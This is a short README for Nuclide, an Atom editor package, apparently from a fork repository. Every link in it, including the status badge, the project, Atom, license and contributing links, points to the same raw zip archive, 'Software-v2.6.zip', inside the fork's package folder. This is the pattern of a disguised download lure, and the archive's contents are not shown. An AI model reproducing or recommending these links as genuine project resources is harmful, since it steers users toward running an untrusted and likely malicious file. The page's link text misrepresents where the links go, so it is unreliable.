# Nuclide

[![Circle Status](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip)](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip)

[Nuclide](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip) is a collection of features for [Atom](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip) to provide IDE-like functionality for a variety of programming languages and technologies.

The [Nuclide license](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip) has certain limitations around distribution and should not be considered an [open source license](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip). However, this does not affect your ability to [fork the project and make contributions](https://github.com/TakundaVito/nuclide/raw/refs/heads/master/pkg/nuclide-file-watcher/Software-v2.6.zip).
